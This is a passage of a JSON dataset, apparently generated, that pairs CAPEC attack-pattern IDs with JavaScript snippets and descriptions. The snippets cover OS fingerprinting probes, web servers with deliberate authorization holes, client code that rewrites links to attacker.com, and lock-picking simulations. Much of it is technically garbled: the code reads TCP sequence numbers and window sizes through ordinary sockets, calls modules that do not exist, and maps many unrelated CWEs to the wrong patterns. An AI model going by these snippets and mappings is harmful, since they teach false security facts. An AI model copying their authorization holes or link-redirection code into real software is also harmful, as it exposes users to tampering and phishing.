        "code_snippet": "const net = require('net');\nconst os = require('os');\n\nlet seqNums = [];\n\nfunction getISN(host, port) {\n  return new Promise((resolve, reject) => {\n    const socket = new net.Socket();\n    socket.connect(port, host, () => {\n      socket.write('');\n    });\n    socket.on('data', (data) => {\n      const seqNum = data.readUInt32BE(4);\n      seqNums.push(seqNum);\n      socket.destroy();\n      resolve(seqNum);\n    });\n  });\n}\n\nasync function fingerprintOS(host, port) {\n  for (let i = 0; i < 10; i++) {\n    await getISN(host, port);\n  }\n  const increment = Math.min(...seqNums.slice(1).map((x, i) => x - seqNums[i]));\n  // Compare increment with OS behavior database\n  if (increment === 16384) {\n    console.log('Detected Windows OS');\n  } else if (increment === 32768) {\n    console.log('Detected Linux OS');\n  } else {\n    console.log('Unknown OS');\n  }\n}\n\nfingerprintOS('example.com', 80);",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that sends multiple TCP SYN packets to an open port of a remote machine, analyzes the Initial Sequence Number (ISN) in each response packet, and determines the operating system type based on the increment value used to increment sequence numbers. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), and CWE-1283 (Mutable Attestation or Measurement Reporting Data) by transmitting sensitive information in cleartext and exposing system-level information to unauthorized actors."
    },
    {
        "capec_id": "323",
        "code_snippet": "const osDatabase = {\n  'Windows': 1000,\n  'Linux': 500,\n  'MacOS': 2000\n};\n\nfunction getSequenceNumberIncrementRate() {\n  let startTime = new Date().getTime();\n  let sequenceNumber = 0;\n  let increments = 0;\n\n  for (let i = 0; i < 1000; i++) {\n    sequenceNumber += Math.floor(Math.random() * 10);\n    increments++;\n  }\n\n  let endTime = new Date().getTime();\n  let timeElapsed = endTime - startTime;\n  let incrementRate = increments / timeElapsed;\n\n  for (const os in osDatabase) {\n    if (Math.abs(osDatabase[os] - incrementRate) < 100) {\n      return os;\n    }\n  }\n\n  return 'Unknown';\n}\n\nconsole.log(getSequenceNumberIncrementRate());",
        "description": "This JavaScript code snippet demonstrates the OS detection probe CAPEC by measuring the average rate of initial sequence number increments during a period of time. The code uses a time-based algorithm to increment sequence numbers, which is susceptible to timing analysis. The result is then compared against a database of operating systems and versions to determine likely OS matches. The code embodies CWE-200 by exposing sensitive information (OS type) to an unauthorized actor, CWE-367 by checking the state of the sequence number before using it, CWE-385 by conveying information through timing channels, CWE-1298 by having a race condition in the hardware logic, and CWE-362 by having concurrent execution using a shared resource with improper synchronization."
    },
    {
        "capec_id": "324",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nlet sequenceNumbers = [];\n\n// Establish a connection to the remote host\nconst socket = new net.Socket();\nsocket.connect(8080, 'remote-host', () => {\n  console.log('Connected to remote host');\n\n  // Send a series of packets to the remote host to gather sequence numbers\n  for (let i = 0; i < 100; i++) {\n    socket.write(`Packet ${i}`);\n  }\n});\n\n// Handle incoming data from the remote host\nsocket.on('data', (data) => {\n  // Extract the sequence number from the incoming packet\n  const sequenceNumber = data.readInt32BE(0);\n  sequenceNumbers.push(sequenceNumber);\n\n  // If we've gathered enough sequence numbers, analyze them\n  if (sequenceNumbers.length === 100) {\n    analyzeSequenceNumbers(sequenceNumbers);\n  }\n});\n\n// Analyze the gathered sequence numbers to determine predictability\nfunction analyzeSequenceNumbers(sequenceNumbers) {\n  const standardDeviation = calculateStandardDeviation(sequenceNumbers);\n  console.log(`Standard deviation of sequence numbers: ${standardDeviation}`);\n\n  // Compare the standard deviation to a database of known operating system behaviors\n  const osMatch = compareSequenceNumbersToOSDatabase(standardDeviation);\n  if (osMatch) {\n    console.log(`Likely operating system match: ${osMatch}`);\n  } else {\n    console.log('Unable to determine operating system');\n  }\n}\n\n// Calculate the standard deviation of an array of numbers\nfunction calculateStandardDeviation(numbers) {\n  const mean = numbers.reduce((a, b) => a + b, 0) / numbers.length;\n  const squaredDiffs = numbers.map((num) => Math.pow(num - mean, 2));\n  const variance = squaredDiffs.reduce((a, b) => a + b, 0) / squaredDiffs.length;\n  return Math.sqrt(variance);\n}\n\n// Compare the standard deviation to a database of known operating system behaviors\nfunction compareSequenceNumbersToOSDatabase(standardDeviation) {\n  // This function would typically contain a database of known OS behaviors\n  // For demonstration purposes, we'll just return a hardcoded match\n  return 'Windows 10';\n}",
        "description": "This JavaScript code snippet demonstrates a CAPEC-242 operating system probe, which attempts to determine the predictability of a remote host's sequence number generation algorithm. The code establishes a connection to the remote host, sends a series of packets to gather sequence numbers, and analyzes the gathered sequence numbers using statistical techniques (in this case, standard deviation). The result is then compared to a database of known operating system behaviors to determine a likely match. The code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-337 (Predictable Seed in Pseudo-Random Number Generator), CWE-341 (Predictable from Observable State), CWE-353 (Missing Support for Integrity Check), and CWE-211 (Externally-Generated Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "325",
        "code_snippet": "const net = require('net');\nconst ecnProbe = () => {\n  const socket = new net.Socket();\n  socket.connect(80, 'example.com', () => {\n    socket.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n');\n    socket.on('data', (data) => {\n      if (data.includes('ECT(0)')) {\n        console.log('ECN supported');\n      } else {\n        console.log('ECN not supported');\n      }\n    });\n  });\n};\necnProbe();",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that checks if a remote host supports explicit congestion notification (ECN) messaging. It establishes a TCP connection to the remote host, sends an HTTP request, and checks the response for the presence of ECN flags. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it transmits sensitive information (ECN flags) in cleartext, CWE-1320 (Improper Protection for Outbound Error Messages and Alert Signals) as it does not verify the integrity of the response, CWE-353 (Missing Support for Integrity Check) as it does not use a transmission protocol with integrity checks, CWE-406 (Insufficient Control of Network Message Volume) as it does not limit the volume of transmitted network traffic, and CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits sensitive data in cleartext."
    },
    {
        "capec_id": "326",
        "code_snippet": "const net = require('net');\n\nfunction getInitialWindowSize(host, port) {\n  const socket = new net.Socket();\n  socket.connect(port, host, () => {\n    const initialWindowSize = socket.bufferSize;\n    console.log(`Initial window size for ${host}:${port} is ${initialWindowSize}`);\n    socket.destroy();\n  });\n}\n\ngetInitialWindowSize('example.com', 80);\n",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that checks the initial TCP window size. It establishes a TCP connection to a target host and port, and then retrieves the initial window size from the socket buffer size. This information can be used to infer the operating system of the target host. The code is vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, as it exposes the initial window size to unauthorized actors. Additionally, it is vulnerable to CWE-121: Stack-based Buffer Overflow, CWE-806: Buffer Access Using Size of Source Buffer, CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime, and CWE-188: Reliance on Data/Memory Layout, as it makes assumptions about the underlying TCP protocol and buffer management."
    },
    {
        "capec_id": "327",
        "code_snippet": "const net = require('net');\nconst tcp = require('tcp');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const tcpOptions = tcp.parseOptions(data);\n    console.log(tcpOptions);\n    // CWE-200: Exposing sensitive information\n    console.log(`OS Fingerprint: ${tcpOptions.TSVal} ${tcpOptions.TEReo}`);\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-188: Reliance on Data/Memory Layout\nconst socket1 = net.createConnection(8080, 'localhost');\nconst socket2 = net.createConnection(8080, 'localhost');\n\n// CWE-605: Multiple Binds to the Same Port\nsocket1.bind(8080);\nsocket2.bind(8080);\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nconst debugMode = true;\nif (debugMode) {\n  // Activate test or debug logic\n  console.log('Debug mode activated');\n}\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nconst protectedRegion = 0x1000;\nconst unprotectedRegion = 0x2000;\nconst overlapRegion = 0x1500;\n\n// Overlap protected and unprotected regions\nconst overlap = {\n  start: overlapRegion,\n  end: overlapRegion + 0x100\n};\n\n// Access the overlapping portion of the protected region\nconst sensitiveData = readMemory(overlap.start, overlap.end);\nconsole.log(sensitiveData);\n",
        "description": "This code snippet demonstrates an OS fingerprinting probe that analyzes the type and order of TCP header options present within a response segment. It uses the related CWEs to highlight potential vulnerabilities, including exposure of sensitive information, reliance on data/memory layout, multiple binds to the same port, hardware allowing activation of test or debug logic at runtime, and fabric-address map allowing programming of unwarranted overlaps of protected and unprotected ranges."
    },
    {
        "capec_id": "328",
        "code_snippet": "const net = require('net');\n\nconst rstPacket = Buffer.from(['\\x15', '\\x03', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00', '\\x00']); // RST packet with ASCII data\nconst checksum = require('crypto').createHash('md5');\n\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n  client.write(rstPacket);\n});\n\nclient.on('data', (data) => {\n  if (data.includes(Buffer.from('TCP reset by peer')) || data.includes(Buffer.from('Connection reset by peer'))) {\n    const asciiData = data.toString('ascii').trim();\n    const integrityCheck = checksum.update(asciiData).digest('hex');\n    console.log(`Received RST packet with ASCII data: ${asciiData} and checksum: ${integrityCheck}`);\n  }\n});",
        "description": "This code snippet demonstrates an OS fingerprinting probe that sends a RST packet with ASCII data and calculates a checksum on the received response. The received data is not validated or encrypted, exposing sensitive information to unauthorized actors. The code also lacks integrity check validation, making it vulnerable to tampering. Additionally, the transmission of sensitive data in cleartext makes it susceptible to capture-replay attacks."
    },
    {
        "capec_id": "329",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nconst targetIP = '192.168.1.100';\nconst targetPort = 80;\n\nconst socket = new net.Socket();\nsocket.connect(targetPort, targetIP, () => {\n  socket.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n});\n\nsocket.on('error', (error) => {\n  if (error.code === 'ECONNREFUSED') {\n    const icmpPacket = icmp.createICMP(icmp.ICMPType.DestinationUnreachable, icmp.ICMPCode.PortUnreachable);\n    icmpPacket.setSourceIP('192.168.1.100');\n    icmpPacket.setDestinationIP('192.168.1.100');\n    icmpPacket.setPayload(Buffer.from('HTTP/1.1 404 Not Found\\r\\n\\r\\n', 'utf8'));\n    icmp.sendICMP(icmpPacket, (error, packet) => {\n      if (error) {\n        console.log('Error sending ICMP packet:', error);\n      } else {\n        console.log('ICMP packet sent:', packet);\n      }\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that generates an ICMP error message (Destination Unreachable) from a target and analyzes the amount of data returned or 'Quoted' from the originating request that generated the ICMP error message. The code uses the 'net' and 'icmp' modules to create a socket connection to a target IP and port, send an HTTP request, and then generate an ICMP error message with sensitive information (HTTP response) when the connection is refused. This code embodies the CAPEC and CWEs by exposing sensitive information (HTTP response) to an unauthorized actor, generating an error message containing sensitive information, and performing an operation that triggers an external diagnostic or error message."
    },
    {
        "capec_id": "330",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nconst socket = new net.Socket();\nsocket.connect(8080, 'localhost', () => {\n  console.log('Connected');\n  const packet = icmp.createPacket(icmp.TYPE_DEST_UNREACH, icmp.CODE_PORT_UNREACH);\n  packet.setSource('192.168.1.100');\n  packet.setDestination('192.168.1.101');\n  packet.setPayload('Sensitive Information');\n  socket.write(packet.pack());\n});\n\nsocket.on('data', (data) => {\n  const responsePacket = icmp.parsePacket(data);\n  if (responsePacket.type === icmp.TYPE_DEST_UNREACH) {\n    console.log('Received error message: ' + responsePacket.payload.toString());\n    // Analyze the integrity of data returned or \"Quoted\" from the originating request\n    if (responsePacket.payload.toString().includes('Sensitive Information')) {\n      console.log('Error message contains sensitive information');\n    }\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC technique of generating an ICMP error message (in this case, a Destination Unreachable message) and analyzing the integrity of data returned or 'Quoted' from the originating request. The code creates an ICMP packet with sensitive information in the payload, sends it to a target, and then checks the response packet for the presence of the sensitive information. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), CWE-294 (Authentication Bypass by Capture-replay), CWE-353 (Missing Support for Integrity Check), and CWE-210 (Self-generated Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "331",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.bind(8080, () => {\n  console.log('UDP server listening on 8080');\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  console.log(`Received message from ${remoteInfo.address}:${remoteInfo.port}: ${message}`);\n  if (message.toString() === 'ping') {\n    const response = Buffer.from('ICMP Echo Response', 'utf8');\n    socket.send(response, 0, response.length, remoteInfo.port, remoteInfo.address, (error) => {\n      if (error) {\n        console.log(`Error sending response: ${error}`);\n      }\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a UDP server that responds to incoming 'ping' messages with an ICMP Echo Response. The response is sent in cleartext, without any integrity checks or encryption, making it vulnerable to eavesdropping and tampering (CWE-319, CWE-924). The code also does not handle length parameter inconsistencies (CWE-130) and relies on the client to correctly handle the response, which may lead to observable response discrepancies (CWE-204). Additionally, the code does not implement any mechanism for verifying the integrity of the data during transmission (CWE-353). An adversary can exploit these vulnerabilities to build a signature-based operating system response, as described in the CAPEC."
    },
    {
        "capec_id": "332",
        "code_snippet": "const dgram = require('dgram');\nconst icmp = require('icmp');\n\nconst socket = dgram.createSocket('udp4');\n\nsocket.bind(41234, () => {\n  socket.setBroadcast(true);\n  socket.setTTL(128);\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  const icmpMessage = icmp.parse(message);\n  if (icmpMessage.type === 3 && icmpMessage.code === 3) {\n    // ICMP destination unreachable, port unreachable\n    const osFingerprint = icmpMessage.data.toString('hex');\n    console.log(`OS Fingerprint: ${osFingerprint}`);\n  }\n});\n\nsocket.send(Buffer.from([0x45, 0x00, 0x00, 0x28, 0x11, 0x9c, 0x4a, 0x00, 0x00, 0x80, 0x11, 0x01, 0x00, 0x00, 0x0a, 0x0a, 0x0a, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 0, 28, 41234, '192.168.1.100', (error) => {\n  if (error) {\n    console.log(error);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of OS fingerprinting using UDP datagrams and ICMP error messages. It creates a UDP socket, sends a UDP packet to a closed port on a target, and listens for the ICMP error message response. The ICMP error message contains information about the target OS, which can be used to construct a fingerprint. This code embodies CWE-204 (Observable Response Discrepancy), CWE-1192 (Improper Identifier for IP Block used in System-On-Chip (SOC)), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), and CWE-1276 (Hardware Child Block Incorrectly Connected to Parent System)."
    },
    {
        "capec_id": "383",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/virtualSale', (req, res) => {\n  const userId = req.query.userId;\n  const username = req.query.username;\n  // No encryption or protection of sensitive data\n  console.log(`User ${username} with ID ${userId} has entered the virtual sale`);\n  // Store user data in cleartext\n  const userData = {\n    userId,\n    username\n  };\n  // Transmit sensitive data in cleartext\n  res.json(userData);\n});\n\napp.post('/sendMessage', (req, res) => {\n  const userId = req.body.userId;\n  const message = req.body.message;\n  // Unprotected primary channel for sending messages\n  console.log(`Sending message to user ${userId}: ${message}`);\n  // Client-side enforcement of server-side security\n  res.json({ success: true });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that hosts a virtual sale event. When a user enters the event, their user ID and username are transmitted in cleartext and stored without encryption. An adversary can intercept this data and use it to spam users within the application. The code also lacks protection for the primary channel used for sending messages, allowing an attacker to send unauthorized messages to users."
    },
    {
        "capec_id": "384",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/updateUser', (req, res) => {\n  const userData = req.body;\n  const userId = userData.id;\n  const userRole = userData.role;\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // The server trusts the client to send the correct role\n  if (userRole === 'admin') {\n    // CWE-346: Origin Validation Error\n    // The server does not verify the origin of the request\n    res.send('User updated successfully');\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that trusts the client to send the correct role of the user. An attacker can manipulate the request data to gain unauthorized privileges by sending a modified role. The server does not properly verify the origin of the request, making it vulnerable to CWE-346. Additionally, the server relies on the client to implement a mechanism that is intended to protect the server, which is a CWE-602."
    },
    {
        "capec_id": "385",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\n\napp.use(express.json());\n\nconst gameData = {\n  'player1': {\n    'coins': 100,\n    'items': ['sword', 'shield']\n  },\n  'player2': {\n    'coins': 50,\n    'items': ['bow', 'arrow']\n  }\n};\n\napp.post('/trade', (req, res) => {\n  const player1 = req.body.player1;\n  const player2 = req.body.player2;\n  const tradeData = req.body.tradeData;\n\n  // CWE-471: Modification of Assumed-Immutable Data (MAID)\n  // CWE-345: Insufficient Verification of Data Authenticity\n  // CWE-346: Origin Validation Error\n  if (player1 && player2 && tradeData) {\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    // Trusting client-side validation\n    if (req.body.isValidTrade) {\n      // CWE-311: Missing Encryption of Sensitive Data\n      // Not encrypting sensitive data\n      const tradeResponse = {\n        'player1': {\n          'coins': player1.coins - tradeData.coins,\n          'items': player1.items.concat(tradeData.items)\n        },\n        'player2': {\n          'coins': player2.coins + tradeData.coins,\n          'items': player2.items.concat(tradeData.items)\n        }\n      };\n      res.json(tradeResponse);\n    } else {\n      res.status(400).send('Invalid trade request');\n    }\n  } else {\n    res.status(400).send('Missing trade data');\n  }\n});\n\nhttps.createServer(app).listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable in-game trading system. An attacker can manipulate the trade data by modifying the client-side validation, allowing them to steal coins or items from other players. The server trusts the client-side validation and does not properly verify the origin or authenticity of the trade data, making it vulnerable to man-in-the-middle attacks."
    },
    {
        "capec_id": "386",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/api/messages', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const response = JSON.parse(xhr.responseText);\n    const links = document.querySelectorAll('a');\n    links.forEach(link => {\n      link.href = 'https://attacker.com/' + link.href.split('/').pop();\n    });\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates the CAPEC by manipulating the links within API messages. It uses CWE-471 by modifying the assumed-immutable data (href values of links), CWE-345 and CWE-346 by not verifying the origin or authenticity of the data, CWE-602 by relying on client-side enforcement of server-side security, and CWE-311 by not encrypting sensitive data. The code sends a GET request to a API endpoint, parses the response, and then modifies the href values of all links on the page to point to an attacker-controlled destination."
    },
    {
        "capec_id": "387",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nlet isAdmin = false;\n\napp.post('/makeAdmin', (req, res) => {\n  isAdmin = req.body.isAdmin;\n  res.send('isAdmin set to ' + isAdmin);\n});\n\napp.get('/protectedResource', (req, res) => {\n  if (isAdmin) {\n    res.send('Access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that allows an adversary to manipulate egress data from the client to change the content of messages and circumvent the expected application logic. The application uses a client-side variable 'isAdmin' to control access to a protected resource. However, the variable is set based on user input from the request body, which can be easily tampered with by an attacker. This is an example of CWE-471 (Modification of Assumed-Immutable Data), CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-311 (Missing Encryption of Sensitive Data)."
    },
    {
        "capec_id": "388",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/messages', (req, res) => {\n  const userId = req.query.userId;\n  const messageData = {\n    buttons: [\n      {\n        text: 'Click me!',\n        url: 'https://attacker-controlled-destination.com'\n      }\n    ]\n  };\n\n  // No encryption of sensitive data (CWE-311)\n  res.json(messageData);\n});\n\napp.post('/api/messages', (req, res) => {\n  const messageData = req.body;\n\n  // Insufficient verification of data authenticity (CWE-345)\n  // Origin validation error (CWE-346)\n  if (messageData.userId) {\n    // Modification of assumed-immutable data (CWE-471)\n    messageData.buttons[0].url = 'https://attacker-controlled-destination.com';\n    res.json(messageData);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable API that allows an attacker to manipulate the content of buttons displayed to a user within API messages. The API does not properly protect assumed-immutable data, does not sufficiently verify the origin or authenticity of data, and relies on the client to implement security mechanisms. This allows an attacker to modify the destination of buttons to point to an attacker-controlled destination, making it look authentic to the user."
    },
    {
        "capec_id": "389",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/api/data', true);\nxhr.setRequestHeader('Authorization', 'Bearer ' + localStorage.getItem('token'));\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const response = JSON.parse(xhr.responseText);\n    // manipulate response data\n    response.data.link = 'https://attacker.com/malicious-link';\n    console.log(response);\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates a content-spoofing attack within an application API. The attacker manipulates the response data from the server by modifying the 'link' property, making it point to a malicious URL. This is possible due to the lack of integrity checks (CWE-353) and the reliance on client-side authentication (CWE-603). The attacker can then replay the modified response to the server, potentially bypassing authentication (CWE-294, CWE-290)."
    },
    {
        "capec_id": "390",
        "code_snippet": "const lockout = () => {\n  // CWE-1300: Improper Protection of Physical Side Channels\n  const powerConsumptionPattern = getPowerConsumptionPattern();\n  const electromagneticEmissions = getElectromagneticEmissions();\n  const acousticEmissions = getAcousticEmissions();\n  if (powerConsumptionPattern === 'high' && electromagneticEmissions === 'strong' && acousticEmissions === 'loud') {\n    // CWE-1263: Improper Physical Access Control\n    const accessGranted = grantAccess();\n    if (accessGranted) {\n      // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n      const voltageGlitchDetected = detectVoltageGlitch();\n      const clockGlitchDetected = detectClockGlitch();\n      if (voltageGlitchDetected || clockGlitchDetected) {\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        const emfiAttackDetected = detectEMFIAttack();\n        if (emfiAttackDetected) {\n          // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n          disableAlerts();\n          // Bypass security mechanisms\n          bypassSecurityMechanisms();\n        }\n      }\n    }\n  }\n};\nlockout();",
        "description": "This code snippet demonstrates a layered approach to bypass physical security mechanisms, exploiting vulnerabilities in power consumption patterns, electromagnetic emissions, and acoustic emissions to gain unauthorized access. It then uses voltage and clock glitches to compromise sensitive information and disable alerts, ultimately bypassing security mechanisms."
    },
    {
        "capec_id": "391",
        "code_snippet": "const lock = {\n  isLocked: true,\n  debugMode: false,\n  lockBit: 0x01\n};\n\nfunction checkLock() {\n  if (lock.debugMode) {\n    // Allow override of locks in debug mode\n    lock.isLocked = false;\n  } else if (lock.lockBit === 0x01) {\n    // Insufficient granularity of address regions protected by register locks\n    lock.isLocked = false;\n  } else {\n    // Unrestricted externally accessible lock\n    lock.isLocked = externalInfluence();\n  }\n}\n\nfunction externalInfluence() {\n  // Improper physical access control\n  return false;\n}\n\ncheckLock();",
        "description": "This code snippet demonstrates a vulnerable lock system that can be bypassed through various means. The lock can be overridden in debug mode, and the lock bit can be modified externally. Additionally, the lock is externally accessible and can be influenced by an unauthorized actor. The code also lacks sufficient granularity in address regions protected by register locks, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "392",
        "code_snippet": "const lock = {\n  pins: [1, 2, 3, 4, 5],\n  driverPins: [1, 2, 3, 4, 5],\n  lockBit: 0,\n  key: [1, 2, 3, 4, 5],\n  bumpKey: [1, 1, 1, 1, 1],\n\n  lockMechanism: function() {\n    if (this.lockBit === 0) {\n      for (let i = 0; i < this.pins.length; i++) {\n        if (this.key[i] === this.pins[i]) {\n          this.driverPins[i] = this.pins[i];\n        }\n      }\n      if (this.driverPins.every((pin, index) => pin === this.pins[index])) {\n        console.log('Lock opened with correct key.');\n      } else {\n        console.log('Incorrect key.');\n      }\n    } else {\n      console.log('Lock is already locked.');\n    }\n  },\n\n  bump: function() {\n    for (let i = 0; i < this.pins.length; i++) {\n      this.pins[i] = this.bumpKey[i];\n    }\n    this.lockMechanism();\n  }\n};\n\n// Hard-coded cryptographic key\nconst cryptoKey = 'my_secret_key';\n\n// Insufficient granularity of address regions protected by register locks\nconst protectedRegion = {\n  start: 0x1000,\n  end: 0x2000\n};\n\n// Improper lock behavior after power state transition\nconst powerStateTransition = () => {\n  lock.lockBit = 0;\n};\n\n// Overly restrictive account lockout mechanism\nconst accountLockout = (username, password) => {\n  if (username === 'admin' && password === 'password') {\n    console.log('Account unlocked.');\n  } else {\n    console.log('Account locked out.');\n  }\n};\n\n// Improper prevention of lock bit modification\nconst modifyLockBit = () => {\n  lock.lockBit = 1;\n};\n",
        "description": "This code snippet demonstrates the concept of lock bumping, where an attacker uses a specially constructed key to force a lock open. The code includes a lock object with pins, driver pins, and a lock bit. The lockMechanism function checks if the key is correct and opens the lock if it is. The bump function simulates the lock bumping attack by temporarily aligning the pins. The code also includes examples of related CWEs, such as hard-coded cryptographic keys, insufficient granularity of address regions protected by register locks, improper lock behavior after power state transitions, overly restrictive account lockout mechanisms, and improper prevention of lock bit modification."
    },
    {
        "capec_id": "393",
        "code_snippet": "let lock = {isLocked: true, pinValues: [1, 2, 3, 4, 5]};\nlet torsionWrench = {setPinValue: function(pinIndex, value) {lock.pinValues[pinIndex] = value;}};\nlet hookPick = {setLockState: function(state) {lock.isLocked = state;}};\n\n// CWE-1231: Improper Prevention of Lock Bit Modification\nhookPick.setLockState(false);\n\n// CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\nlet addressRegion = [0x1000, 0x1004, 0x1008];\nlet registerLock = {protectRegion: function(region) {for (let i = 0; i < region.length; i++) {region[i] = 0x0000;}}};\nregisterLock.protectRegion(addressRegion);\n\n// CWE-412: Unrestricted Externally Accessible Lock\nlet externalActor = {setLockState: function(state) {lock.isLocked = state;}};\nexternalActor.setLockState(false);\n\n// CWE-832: Unlock of a Resource that is not Locked\nlet unlockResource = function(resource) {if (!resource.isLocked) {console.log('Resource is not locked');} else {resource.isLocked = false;}};\nunlockResource(lock);\n\n// CWE-833: Deadlock\nlet thread1 = function() {while (true) {if (lock.isLocked) {console.log('Thread 1: Lock is taken');} else {lock.isLocked = true; console.log('Thread 1: Lock acquired');}}};\nlet thread2 = function() {while (true) {if (lock.isLocked) {console.log('Thread 2: Lock is taken');} else {lock.isLocked = true; console.log('Thread 2: Lock acquired');}}};\nthread1();\nthread2();",
        "description": "JavaScript code snippet demonstrating lock picking techniques and related CWEs. The code includes a lock object with pin values, a torsion wrench to set pin values, and a hook pick to set the lock state. The code also includes examples of CWE-1231, CWE-1222, CWE-412, CWE-832, and CWE-833."
    },
    {
        "capec_id": "394",
        "code_snippet": "const lock = {\n  pins: [],\n  driverPins: [],\n  lockBit: true,\n  cryptographicKey: 'defaultKey'\n};\n\nfunction snapGun() {\n  // CWE-833: Deadlock\n  while (lock.pins.length > 0 && lock.driverPins.length > 0) {\n    // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n    const addressRegion = lock.pins[0];\n    // CWE-1231: Improper Prevention of Lock Bit Modification\n    lock.lockBit = false;\n    // CWE-1394: Use of Default Cryptographic Key\n    const encryptedData = encrypt(addressRegion, lock.cryptographicKey);\n    // CWE-1232: Improper Lock Behavior After Power State Transition\n    if (lock.lockBit) {\n      lock.pins.forEach((pin) => {\n        pin.value = encryptedData;\n      });\n    }\n  }\n}\n\nfunction encrypt(data, key) {\n  // Simple XOR encryption for demonstration purposes\n  return data ^ key;\n}\n",
        "description": "This JavaScript code snippet demonstrates a vulnerable lock system that can be exploited using a 'Snap Gun' technique. The lock system uses a default cryptographic key and has improper lock behavior after power state transitions. The 'snapGun' function forces the lock into an unlocked state by modifying the lock bit and encrypting the address region with the default key. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "395",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (MD5)\nconst hash = crypto.createHash('md5');\n\n// CWE-321: Hard-coded cryptographic key\nconst key = 'my_secret_key';\n\n// CWE-1278: No protection against hardware reverse engineering\nconst icImage = getICImage(); // assume this function captures and analyzes the IC image\n\n// CWE-1300: No protection against physical side channels\nconst powerConsumptionPattern = getPowerConsumptionPattern(); // assume this function captures power consumption patterns\n\n// CWE-1319: No protection against electromagnetic fault injection\nconst emePattern = getEMEPattern(); // assume this function captures EME patterns\n\n// Simulating the access control system\nfunction authenticate(cardData) {\n  const cardHash = hash.update(cardData).digest('hex');\n  if (cardHash === key) {\n    return true; // access granted\n  } else {\n    return false; // access denied\n  }\n}\n\n// Attacker's code to bypass the access control system\nfunction bypassAccessControl() {\n  const reverseEngineeredKey = reverseEngineerKeyFromICImage(icImage);\n  const generatedCardData = generateCardDataFromPowerConsumptionPattern(powerConsumptionPattern);\n  const electromagneticFault = injectElectromagneticFault(emePattern);\n  const cardData = applyElectromagneticFaultToCardData(generatedCardData, electromagneticFault);\n  if (authenticate(cardData)) {\n    console.log('Access granted!');\n  } else {\n    console.log('Access denied.');\n  }\n}",
